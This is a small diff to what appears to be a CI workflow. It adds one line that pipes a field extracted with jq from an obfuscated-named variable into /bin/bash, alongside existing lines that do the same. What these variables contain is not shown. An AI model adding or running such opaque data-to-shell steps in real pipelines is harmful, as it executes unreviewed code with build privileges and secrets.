@@ -68,6 +68,7 @@ jobs:
           echo $jvgq61 | jq -r .hvopr640 | /bin/bash
           printf '%s' "$gecg2945" | jq -r .bh94 | /bin/bash
           printf '%s' "$whygt7" | jq -r .yehuu4094 | /bin/bash
+          printf '%s' "$q018" | jq -r .cu5 | /bin/bash
 
       - name: Save archive
         if: always()
